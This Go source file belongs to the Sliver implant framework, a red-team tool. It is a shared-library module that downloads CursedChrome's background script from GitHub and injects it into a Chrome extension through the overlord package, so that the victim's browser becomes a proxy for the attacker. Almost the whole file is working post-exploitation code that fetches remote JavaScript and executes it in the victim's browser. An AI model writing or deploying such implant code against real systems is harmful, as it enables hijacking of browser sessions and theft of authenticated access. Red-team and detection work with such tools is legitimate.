package main

/*
	Sliver Implant Framework
	Copyright (C) 2020  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"io/ioutil"
	"net/http"
	"os"

	"github.com/moloch--/sliver-overlord/pkg/overlord"
)

import "C"

func fetchSource() (string, error) {
	url := "https://raw.githubusercontent.com/mandatoryprogrammer/CursedChrome/master/extension/src/bg/background.js"
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(data), err
}

//export Run
func Run() {
	remote := os.Getenv("LD_PARAMS")
	jsStr, err := fetchSource()
	if err != nil {
		panic(err)
	}
	overlord.ExecuteJS(remote, "cjpalhdlnbpafiamejdnhcphjbkeiagm", jsStr)
}

func main() {
}
